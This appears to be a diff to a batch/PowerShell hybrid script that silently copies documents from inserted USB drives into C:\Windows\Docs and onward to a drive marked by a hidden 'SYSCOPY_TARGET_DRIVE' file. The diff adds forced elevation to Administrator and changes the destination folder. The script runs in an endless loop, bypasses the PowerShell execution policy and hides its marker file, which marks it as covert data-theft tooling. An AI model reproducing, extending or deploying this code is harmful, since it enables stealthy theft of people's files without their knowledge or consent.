@@ -6,8 +6,11 @@
 :: USB documents are then copied automatically and silently.
 :: Double-click again to reinstall or uninstall.
 :: ============================================================
+:: Auto-Elevate to Administrator
+net session >nul 2>&1
+if %errorLevel% neq 0 (powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" & exit /b)
 set "T=%TEMP%\uac_%RANDOM%.ps1"
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c=Get-Content -LiteralPath '%~f0'; Set-Content -LiteralPath '%T%' -Value $c[11..($c.Count-1)] -Encoding UTF8"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c=Get-Content -LiteralPath '%~f0'; Set-Content -LiteralPath '%T%' -Value $c[14..($c.Count-1)] -Encoding UTF8"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%T%" & del "%T%" 2>nul & exit /b
 
 $DestRoot    = 'C:\Windows\Docs'
@@ -115,6 +118,8 @@ while ([bool]1) {
                     Set-Content -LiteralPath $targetFile -Value 'SYSCOPY_TARGET_DRIVE' -Encoding UTF8 -ErrorAction SilentlyContinue
                     try { (Get-Item -LiteralPath $targetFile).Attributes = 'Hidden' } catch {}
                 }
+                $docsFolder = Join-Path $root 'docs'
+                if (-not (Test-Path -LiteralPath $docsFolder)) { New-Item -ItemType Directory -Path $docsFolder -Force | Out-Null }
                 
                 $copied = 0
                 foreach ($ext in $Exts) {
@@ -122,7 +127,7 @@ while ([bool]1) {
                     foreach ($file in $files) {
                         $relPath = $file.FullName.Substring($DestRoot.Length)
                         if ($relPath.StartsWith('\')) { $relPath = $relPath.Substring(1) }
-                        $dest = Join-Path $root $relPath
+                        $dest = Join-Path $docsFolder $relPath
                         $destFolder = Split-Path $dest -Parent
                         if (-not (Test-Path -LiteralPath $destFolder)) { New-Item -ItemType Directory -Path $destFolder -Force | Out-Null }
                         try {
